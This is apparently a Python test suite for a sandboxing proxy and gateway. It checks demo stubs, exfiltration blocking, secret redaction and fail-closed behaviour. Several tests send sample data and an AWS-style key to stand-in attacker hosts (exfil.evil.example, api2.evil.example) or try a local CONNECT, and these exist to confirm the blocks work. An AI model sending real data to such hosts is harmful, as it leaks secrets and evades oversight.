"""Stdlib proxy (proxy.py) wired to the gateway's /net/judge: demo stubs for
api.example.com, exfil blocks, header redaction, and fail-closed behavior when
the gateway is down.

Gateway and proxy both run in threads on ephemeral ports with a temp A10_HOME.
"""
import json
import os
import socket
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from _support import GatewayFixture, ProxyFixture  # noqa: E402

SECRET_HEADERS = {
    "Authorization": "Bearer tok-authz-5f1e2d3c4b",
    "x-api-key": "xkey-9a8b7c6d5e4f",
    "Cookie": "session=cookieval-123abc",
    "Proxy-Authorization": "Basic cHJveHk6c2VjcmV0dmFs",
}
SECRET_VALUES = ("tok-authz-5f1e2d3c4b", "xkey-9a8b7c6d5e4f",
                 "cookieval-123abc", "cHJveHk6c2VjcmV0dmFs")


def closed_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


class ProxyTest(unittest.TestCase):
    def setUp(self):
        self.gw = GatewayFixture(mode="default", approval_wait=5.0)
        self.px = ProxyFixture(self.gw.url, demo_stubs=True)

    def tearDown(self):
        self.px.close()
        self.gw.close()

    def net_events(self):
        return [e for e in self.gw.events() if e["kind"] == "net"]

    def test_demo_stub_status_is_allowed_row_8(self):
        r = self.px.request("GET", "http://api.example.com/status")
        self.assertEqual(r.status, 200)
        self.assertEqual(r.json(), {"project": "a10-harness", "status": "ok",
                                    "notes_reviewed": True})
        self.assertEqual(r.headers.get("x-a10-demo-stub"), "1")
        ev = self.net_events()[-1]
        self.assertEqual((ev["verdict"], ev["row"], ev["source"]),
                         ("allow", "8", "proxy-stdlib"))
        self.assertEqual(ev["args"]["host"], "api.example.com")

    def test_demo_stub_notes_post_and_404(self):
        r = self.px.request("POST", "http://api.example.com/notes", body=b"hello",
                            headers={"Content-Type": "text/plain"})
        self.assertEqual((r.status, r.json()), (200, {"ok": True,
                                                      "received_bytes": 5}))
        r = self.px.request("GET", "http://api.example.com/missing")
        self.assertEqual(r.status, 404)

    def test_exfil_post_is_blocked_row_20(self):
        r = self.px.request("POST", "http://exfil.evil.example/upload",
                            body=b"Project notes", headers={
                                "Content-Type": "text/plain"})
        self.assertEqual(r.status, 403)
        body = r.json()
        self.assertTrue(body["blocked"])
        self.assertEqual(body["row"], "20")
        self.assertIn("row 20", body["reason"])
        ev = self.net_events()[-1]
        self.assertEqual((ev["verdict"], ev["row"]), ("block", "20"))
        self.assertEqual(ev["args"]["body_len"], len(b"Project notes"))

    def test_secret_in_body_blocks(self):
        r = self.px.request("POST", "http://api2.evil.example/x",
                            body=("k=AKIA" + "D" * 16).encode())
        self.assertEqual(r.status, 403)
        self.assertEqual(r.json()["row"], "20")
        self.assertNotIn("AKIA" + "D" * 16, json.dumps(self.gw.events()))

    def test_local_connect_is_blocked_row_19(self):
        conn = socket.create_connection(("127.0.0.1", self.px.port), timeout=10)
        try:
            conn.sendall(b"CONNECT 127.0.0.1:%d HTTP/1.1\r\nHost: x\r\n\r\n"
                         % self.gw.port)
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
        finally:
            conn.close()
        self.assertIn(b" 403 ", data.split(b"\r\n", 1)[0])
        self.assertEqual(self.net_events()[-1]["row"], "19")

    def test_sensitive_headers_never_reach_events_or_audit(self):
        r = self.px.request("GET", "http://api.example.com/status",
                            headers=SECRET_HEADERS)
        self.assertEqual(r.status, 200)
        r = self.px.request("POST", "http://exfil.evil.example/upload",
                            body=b"x", headers=SECRET_HEADERS)
        self.assertEqual(r.status, 403)
        ev = self.net_events()[-2]
        self.assertIn("REDACTED", ev["args"]["headers"]["Authorization"])
        self.assertTrue(ev["args"]["headers"]["Authorization"].startswith("Bearer "))
        dashboard_data = json.dumps([self.gw.events(), self.gw.pending(),
                                     self.gw.status()])
        with open(self.gw.audit_path) as f:
            audit_text = f.read()
        for value in SECRET_VALUES:
            self.assertNotIn(value, dashboard_data)
            self.assertNotIn(value, audit_text)
        self.assertTrue(self.gw.get("/audit").json()["ok"])


class GatewayDownTest(unittest.TestCase):
    def test_gateway_unreachable_fails_closed(self):
        px = ProxyFixture("http://127.0.0.1:%d" % closed_port(), demo_stubs=True)
        try:
            r = px.request("GET", "http://api.example.com/status")
            self.assertEqual(r.status, 403)
            body = r.json()
            self.assertTrue(body["blocked"])
            self.assertIn("gateway unreachable", body["reason"])
        finally:
            px.close()


if __name__ == "__main__":
    unittest.main()
